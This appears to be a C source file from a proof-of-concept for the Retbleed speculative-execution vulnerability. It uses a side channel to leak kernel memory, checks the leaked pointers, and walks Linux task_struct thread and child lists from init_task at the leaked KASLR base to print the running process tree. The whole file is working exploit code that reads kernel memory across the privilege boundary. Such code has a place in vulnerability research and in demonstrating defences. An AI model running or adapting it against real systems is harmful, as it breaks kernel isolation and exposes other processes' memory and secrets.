/* SPDX-License-Identifier: GPL-3.0-only */
#include <err.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>

#include "retbleed.h"
#include "defs.h"

#define fatal(...) err(EXIT_FAILURE, __VA_ARGS__)
#define fatalx(...) errx(EXIT_FAILURE, __VA_ARGS__)

static u64 leak_u64(struct retbleed *r, u64 address)
{
    u64 ret;
    for (int i = 0; i < 10; i++) {
        if (retbleed_leak_kernel_memory(r, address, sizeof(ret), (u8 *)&ret) == sizeof(ret)) {
            return ret;
        }
    }
    fatalx("Failed to leak kernel memory @ %#lx\n", address);
}

/* Verify that a kernel pointer looks valid. */
static bool valid_kptr(u64 ptr, u64 alignment)
{
    return (ptr == 0 || (ptr >> 48) == 0xffff) && (ptr % alignment == 0);
}

/* Leak a kernel pointer. */
u64 leak_kptr(struct retbleed *r, u64 address, u64 alignment)
{
    u64 leak = 0;
    for (int i = 0; i < 10; i++) {
        leak = leak_u64(r, address);
        if (valid_kptr(leak, alignment)) {
            return leak;
        }

        fprintf(stderr, "[-] Failed to leak kernel pointer @ %#lx (leaked %#lx), retrying...\n", address, leak);
    }
    fatalx("[-] Giving up");
}

static void print_task(struct retbleed *retbleed, u64 task)
{
    char comm[16];
    retbleed_leak_kernel_memory(retbleed, task + retbleed->config.task_struct_comm_offset, sizeof(comm), (u8 *)comm);
    printf("%s @ %#lx\n", comm, task);
}

static void print_children(struct retbleed *r, u64 task, int indent)
{
    for (int i = 0; i < indent; i++) {
        putchar('\t');
    }

    print_task(r, task);

    u64 thread, child;
    u64 thread_list_start = leak_kptr(r, task + r->config.task_struct_signal_offset, 8) +
        r->config.signal_struct_thread_head_offset;
    u64 thread_list_offset = r->config.task_struct_thread_node_offset;

    for (thread = leak_kptr(r, thread_list_start, 8) - thread_list_offset;
        thread + thread_list_offset != thread_list_start;
        thread = leak_kptr(r, thread + (thread_list_offset), 8) - thread_list_offset) {

        u64 child_list_start = thread + r->config.task_struct_children_offset;
        u64 child_list_offset = r->config.task_struct_children_offset + 16;

        for (child = leak_kptr(r, child_list_start, 8) - child_list_offset;
            child + child_list_offset != child_list_start;
            child = leak_kptr(r, child + child_list_offset, 8) - child_list_offset) {

            u64 mm = leak_kptr(r, child + r->config.task_struct_mm_offset, 8);
            if (mm == 0) {
                // Skip kernel threads
                continue;
            }

            print_children(r, child, indent + 1);
        }
    }
}

void print_process_tree(struct retbleed *r)
{
    u64 init_task = r->kaslr_base + r->config.init_task_offset;
    print_children(r, init_task, 0);
}
